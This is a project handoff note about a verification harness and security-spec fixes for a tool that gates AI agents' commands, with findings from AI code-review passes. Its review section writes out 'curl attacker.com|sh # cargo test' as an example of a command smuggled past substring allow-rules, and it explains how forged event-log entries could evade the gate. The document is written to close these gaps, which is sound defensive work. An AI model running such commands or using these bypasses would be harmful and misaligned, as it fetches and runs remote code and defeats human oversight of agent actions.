# Verification harness + spec hardening — handoff & next steps

**Date:** 2026-07-03
**Branch:** `main` @ `d3297b9`
**Epic / itr:** itr#413 (verification harness, Sprint 0) + the fable-tier spec passes itr#421–424
**Closed this session:** itr#413, #414, #415, #416, #417, #418, #419, #420, #421, #422, #423, #424
**Filed this session:** itr#425 (~/.wisphive default-deny, under #403), #426 (decided_by bulk+ingest-label guard), #427 (webauthn residentKey), #428 (deferred e2e coverage), #429 (status-bar mechanical link), #430 (spawn 'error' handler), #431 (stale plugins Part D), #432 (e2e claim/proof gaps)
**Predecessor handoff:** `docs/handoff/2026-07-03-decision-plane-trust-phase1.md`

If you only have 60 seconds: the verification harness shipped and is green (`just verify`, 7 e2e specs). A Claude adversarial review + a 4-way **Codex** review pass then ran over the whole branch. The Codex pass confirmed the harness is safe (no `~/.wisphive` leak, no gating weakened) but found three defects introduced by this session's own commits (items **A, B, D** below). **All three were fixed after re-assessment** (`10a94b5` fix(e2e), `d3297b9` docs); the remaining lower findings (C, E, and the LOW claim/proof gaps) were filed as itr#430/#431/#432. This handoff records the full review trail; the tree is green and the follow-ups are tracked.

## What just shipped

An operator can now run `just verify` as a single close-with-evidence gate (fmt, clippy, Rust tests incl. TUI snapshots, frontend lint+vitest, and 7 Playwright e2e specs), each under its own `gatr` tag. Two previously human-only surfaces became agent-closable: the web UI (login, socket-level approve/deny round-trip, passkey enroll+login via a CDP virtual authenticator, TLS/wss/h2) and the TUI (ratatui `TestBackend` snapshots). Four v2 workstream plans gained normative security/semantics sections backed by ADR-0005–0007, so a future implementer inherits pinned invariants instead of re-deriving the threat model.

```
5a41ffa test(web): Playwright e2e infrastructure + first-run smoke (itr#414)
1305b62 test(web): core-flow, passkey, TLS/wss/h2 specs (itr#415-417)
e42cd24 test(tui): TestBackend snapshot harness + status-bar fixes (itr#418)
dc3d2ab docs(smoke): batched human smoke-checklist convention (itr#420)
392f031 build: just verify via gatr + just e2e (itr#419)
500f09c docs(specs): normative sections + ADRs 0005-0007 (itr#421-424)
ad69aa8 chore(sprint): blitz run log (itr#413)
0e16eca test(web): close first-review findings in e2e specs + boot helpers
c70a14a docs(specs): tighten invariants from adversarial spec review
```

| Surface | Anchor |
|---|---|
| e2e boot + isolation | `crates/wisphive_web/frontend/e2e/helpers/server.ts`, `fixtures/daemon-server.ts` |
| socket hook fixture | `crates/wisphive_web/frontend/e2e/fixtures/hook-client.ts` |
| TUI snapshot harness | `crates/wisphive_tui/tests/ui_snapshots.rs` |
| verify gate | `justfile` (`verify`, `e2e` recipes) |
| spec invariants | `docs/plan-policy-learning-engine.md`, `docs/plan-decision-plugins.md`, `docs/plan-cross-agent-conflict-gate.md`, `docs/plan-loop-supervisor.md`, `docs/decisions/0005–0007` |

## How this was verified

Two review layers ran after commit, both verifying claims against real code:

1. **Claude adversarial pass** (2 agents) — surfaced 3 harness SHOULD-FIX and 4 spec fixes, all applied in `0e16eca` + `c70a14a` before this handoff.
2. **Codex `exec` pass** (4 agents, gpt-5.5 xhigh, each finding confirm/refute-checked against source) — lenses: e2e TS hygiene, e2e assertion quality, Rust TUI harness, security cross-cut. Note: `codex exec review --base <sha>` rejects a custom prompt in codex 0.142.5, so agents drove `codex exec` with the range baked into the prompt instead.

## Codex review outcomes — the re-assessment queue

**Resolution (post-re-assessment):** A, B, D fixed in `10a94b5` + `d3297b9`; C→itr#430, E→itr#431, LOW notes→itr#432. Items below are kept as the review record.

**None are shipped-code security regressions.** Isolation is sound (HOME override is last in the env spread so `opts.env` can't clobber it; the `realHome` containment guard aborts if the temp dir resolves inside `~`; the notification PATH-stub is child-env-only). Ordered by my recommended priority:

- **A [SHOULD-FIX] — reaper regression introduced by `0e16eca`.** `helpers/server.ts` and `fixtures/daemon-server.ts` each register their *own* module-level SIGINT/SIGTERM handler that calls `process.exit()` after reaping. Two problems: (1) `process.exit()` in a signal handler can preempt Playwright's own async teardown; (2) Playwright reuses workers across spec files — if one worker loads both modules, the first handler's `process.exit()` runs and the sibling module's `reap()` never fires, leaking its tracked processes/temp dirs. Fix: one shared reaper module, and reap without `process.exit()` (or re-raise the signal after cleanup). *This is a regression from the fix that closed the original orphan-reaper finding — the fix was right in intent, wrong in duplication.*

- **B [MEDIUM, factual error in committed spec `c70a14a`] — I4's `auto_approved=0` handle is wrong.** `docs/plan-policy-learning-engine.md:507` claims every `events.jsonl` ingest lands as `auto_approved=1`. Verified false: `event_ingest.rs:290-292` maps `deferred→ask`/`denied→deny` and `decisions.rs:371` sets `auto_approved = (decision == "approve")`, so a forged `{"event":"denied"|"deferred"}` append lands as `auto_approved=0` — inside the set I4 calls unforgeable. The approve path *is* still sound (forged approve→`auto_approved=1`, excluded). Fix: the learner keys on `auto_approved=0 AND decision='approve'` (it only learns from approvals anyway), and I4's prose must say so. Latent (learner unshipped) but it will mislead the implementer.

- **D [MEDIUM, self-contradiction in `docs/plan-policy-learning-engine.md`] — I2 vs the Accept example.** I2 (lines 483-489) forbids the learner from ever writing `allow_patterns` (substring-matched by `main.rs:1499`), but the Accept example (line 411) and `PolicySuggestion.rule_type` (line 662) still emit `allow_patterns`. Following the example re-creates the exact `curl attacker.com|sh # cargo test` smuggling bypass I2 exists to prevent. Fix: update the example + rule_type to the anchored `allow_prefix` type. (Pre-existing from earlier drafts; my I2 edit didn't propagate to the example.)

- **C [SHOULD-FIX, pre-existing from #414/#415] — no `spawn('error')` listener** in both boot helpers. On a binary EACCES / post-`existsSync` race, `'error'` fires with `child.pid` undefined, `'exit'` never fires, so the ready loop spins the full 30s and the unhandled `'error'` throws in the worker. Add `child.once('error', …)`.

- **E [LOW, stale text from `500f09c`] — `docs/plan-decision-plugins.md:641`** (Part D) still says to shell-escape `{{vars}}` into commands, contradicting normative T3 (env-vars only, no interpolation). Delete/rewrite stale Part D.

- **Test-quality LOW notes (claim/proof gaps, not bugs):** tls.spec docstring overclaims h2 on the *authenticated* request (only the unauth fetch asserts `nextHopProtocol`); deny-reason round-trip is blind to whitespace/newline mangling (`Modal.tsx` trims); `mintToken` does a no-retry login that can flake under the throttle set by the login test (cross-test coupling); `toPass({20_000})` still couples to the throttle budget; status-bar completeness is honor-system with substring token matching (already filed **#429**). `justfile` `{{args}}` is shell-injectable but operator-self-only and untouched by `just verify` (which passes no args); fail-fast confirmed sound.

**Refuted noise (Codex wrong):** Darwin `process.kill(-pid)` group-kill is correct; `hook-client.ts` socket-path handling is fine (only ever the isolated temp socket).

## Trade-offs made

- **Review-before-fix, twice.** Committed the harness first, then reviewed — consistent with the house review workflow. Cost: two defects (A, B) reached `main` and are now flagged for a follow-up rather than caught pre-commit. Benefit: the Codex pass had a real, committed artifact to attack, and it earned its keep.
- **Codex via `exec`, not `review --base`.** The `review` subcommand couldn't take a focus prompt in this codex build; `exec` with the range in the prompt gave per-lens differentiation at the cost of not using the purpose-built review path.
- **Spec docs kept normative-but-unimplemented.** ADR-0005–0007 are `Proposed`; the invariants gate future work but nothing enforces them yet. B and D show the risk: a spec can be internally inconsistent and only a careful reader (or a second engine) catches it.

## What's NOT shipped — explicit scope gaps

1. **Loop supervisor** (itr#421) — plan only; Phase 3+ gated on dogfooding ≥2 wisphive-gated campaigns.
2. **~/.wisphive default-deny** (itr#425) — blocks the policy-learning engine; not started.
3. **Deferred e2e coverage** (itr#428) — sudo-reauth modal, devices UI (after #220), AskUserQuestion (with #250).
4. **Codex findings C, E, and the LOW notes** — filed as itr#430 (spawn 'error' handler), #431 (stale plugins Part D), #432 (e2e claim/proof gaps). A, B, D already fixed.

## Hard rules established this session

1. **e2e never touches the real `~/.wisphive`.** Every server boots via the two helpers with `HOME=<tempdir>` (last in the env spread) + the `realHome` containment guard. A live daemon gates the dev session; a test that reads the real state dir is a stop-the-line bug. DO NOT add a boot path that bypasses the helpers.
2. **`just verify` is the close-with-evidence gate.** Green means every `gatr` sub-tag exited 0. Fail-fast is load-bearing — do not reorder into a form where a red sub-gate can be masked.
3. **Learned auto-approve rules never use substring `allow_patterns`** (I2) — the anchored `allow_prefix` type only. B and D above are the live reminders that the doc still violates this in places.

## Where to start next

The Sprint 0 review loop is closed (A/B/D fixed, C/E/LOW filed, `just verify` green). Next:

1. Resume the roadmap at the Phase 2 integrity epic (itr#403), which itr#425 (~/.wisphive default-deny) now feeds — that hardening blocks the policy-learning engine.
2. Or start dogfooding campaigns (blitz/proof-campaign gated by wisphive) to generate the friction data that unblocks the loop-supervisor design (itr#421, its "Awaiting dogfood data" section).
3. Clear the Codex follow-ups when convenient: itr#430 (fast-fail on bad binary), #431 (docs consistency), #432 (e2e assertion tightening), #429 (mechanical status-bar link).
